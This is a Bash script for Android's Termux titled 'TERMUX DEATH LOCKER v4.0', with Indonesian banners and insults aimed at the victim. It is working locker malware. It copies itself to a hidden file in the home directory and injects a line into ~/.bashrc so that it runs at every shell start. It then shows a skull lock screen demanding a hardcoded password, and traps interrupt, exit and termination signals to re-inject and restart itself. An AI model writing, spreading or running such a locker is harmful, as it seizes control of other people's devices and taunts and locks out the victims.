#!/data/data/com.termux/files/usr/bin/bash

# ============================================
# TERMUX DEATH LOCKER v4.0 - by zyx
# ============================================

PASSWORD="1111"
LOCK_FILE="$HOME/.termux_locked"
BASH_RC="$HOME/.bashrc"
SCRIPT_PATH="$HOME/.termux_death_locker.sh"
INJECT_MARKER="# ===== TERMUX DEATH LOCKER - by zyx ====="

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'

show_boot() {
    clear
    echo -e "${RED}${BOLD}"
    cat << "EOF2"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██╗  ██╗ █████╗ ██████╗ ██╗    ██╗███████╗███╗   ███╗    ║
║   ██║  ██║██╔══██╗██╔══██╗██║    ██║██╔════╝████╗ ████║    ║
║   ███████║███████║██████╔╝██║ █╗ ██║█████╗  ██╔████╔██║    ║
║   ██╔══██║██╔══██║██╔══██╗██║███╗██║██╔══╝  ██║╚██╔╝██║    ║
║   ██║  ██║██║  ██║██║  ██║╚███╔███╔╝███████╗██║ ╚═╝ ██║    ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝     ╚═╝    ║
║                                                               ║
║   ███╗   ███╗██╗   ██╗                                      ║
║   ████╗ ████║╚██╗ ██╔╝                                      ║
║   ██╔████╔██║ ╚████╔╝                                       ║
║   ██║╚██╔╝██║  ╚██╔╝                                        ║
║   ██║ ╚═╝ ██║   ██║                                         ║
║   ╚═╝     ╚═╝   ╚═╝                                         ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF2
    echo -e "${RED}${BLINK}${BOLD}"
    echo "     ╔═══════════════════════════════════════════════════╗"
    echo "     ║   ☠️  HARI KEMATIAN TERMUX MU  ☠️               ║"
    echo "     ║   TERMUX TELAH DIKUNCI OLEH ZYX                 ║"
    echo "     ║   TIDAK ADA YANG BISA SELAMAT                  ║"
    echo "     ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}════════════════════════════════════════════════════════════${NC}"
    echo ""
}

inject_bashrc() {
    sed -i "/$INJECT_MARKER/d" "$BASH_RC" 2>/dev/null
    sed -i '/termux_death_locker/d' "$BASH_RC" 2>/dev/null
    sed -i '/termux_locked/d' "$BASH_RC" 2>/dev/null

    echo "" >> "$BASH_RC"
    echo "$INJECT_MARKER" >> "$BASH_RC"
    echo "bash \"$SCRIPT_PATH\"" >> "$BASH_RC"
    echo "# =========================================" >> "$BASH_RC"
}

lock_screen() {
    show_boot
    echo -e "${CYAN}${BOLD}🔐 MASUKKAN PASSWORD:${NC}"
    echo ""
    echo -e "${YELLOW}Password:${NC} \c"
    read -s user_pass
    echo ""

    if [[ "$user_pass" == "$PASSWORD" ]]; then
        echo -e "${GREEN}${BOLD}✅ AKSES DIBERIKAN!${NC}"
        sleep 1
        rm -f "$LOCK_FILE"
        sed -i "/$INJECT_MARKER/d" "$BASH_RC" 2>/dev/null
        clear
        exec bash
    else
        echo -e "${RED}${BOLD}❌ PASSWORD SALAH!${NC}"
        sleep 1
        touch "$LOCK_FILE"
        inject_bashrc
        exec bash "$SCRIPT_PATH"
    fi
}

trap_everything() {
    trap 'echo -e "${RED}${BOLD}🔴 MAU KABUR? GA BISA GOBLOK!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' INT
    trap 'echo -e "${RED}${BOLD}🔴 CTRL+Z GA BISA BANGSAT!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' TSTP
    trap 'echo -e "${RED}${BOLD}🔴 EXIT? LOCK TETAP AKTIF!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' EXIT
    trap 'echo -e "${RED}${BOLD}🔴 TERMUX MATI? BUKA LAGI TETAP LOCK!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' TERM
    trap 'echo -e "${RED}${BOLD}🔴 GA BISA KABUR COK!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' HUP
    trap 'echo -e "${RED}${BOLD}🔴 PERCAYA AJA GA BISA!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' QUIT
    trap 'echo -e "${RED}${BOLD}🔴 MAU APA LAGI? TETAP TERKUNCI!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' KILL
    trap 'echo -e "${RED}${BOLD}🔴 SIALAN GA BISA KABUR!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' PIPE
    trap 'echo -e "${RED}${BOLD}🔴 UDAH USAHA MATI AJA!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' ABRT
    trap 'echo -e "${RED}${BOLD}🔴 STFU! LOCK TETAP!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' FPE
    trap 'echo -e "${RED}${BOLD}🔴 GA BISA KABUR GOBLOK!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' USR1
    trap 'echo -e "${RED}${BOLD}🔴 BOCIL GA BISA KABUR!${NC}"; sleep 1; inject_bashrc; exec bash "$SCRIPT_PATH"' USR2
}

if [[ -f "$LOCK_FILE" ]]; then
    trap_everything
    while true; do
        inject_bashrc
        lock_screen
        sleep 0.5
    done
else
    sed -i "/$INJECT_MARKER/d" "$BASH_RC" 2>/dev/null
    sed -i '/termux_death_locker/d' "$BASH_RC" 2>/dev/null
    sed -i '/termux_locked/d' "$BASH_RC" 2>/dev/null
    rm -f "$LOCK_FILE" 2>/dev/null

    cp "$0" "$SCRIPT_PATH"
    chmod +x "$SCRIPT_PATH"

    inject_bashrc
    touch "$LOCK_FILE"

    exec bash "$SCRIPT_PATH"
fi
